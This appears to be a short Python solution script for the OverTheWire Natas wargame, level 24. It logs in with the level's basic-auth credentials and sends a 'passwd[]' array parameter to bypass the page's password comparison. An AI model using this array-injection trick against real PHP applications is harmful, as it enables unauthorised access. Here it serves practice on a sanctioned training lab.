import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas24', 'shlL4BvOtawNCd81dwdKRHFzmTEjYYQX')
url = "http://natas24.natas.labs.overthewire.org/index.php"

r = requests.get(url, auth=basicAuth, params={"passwd[]": "anything"})
print(r.text)

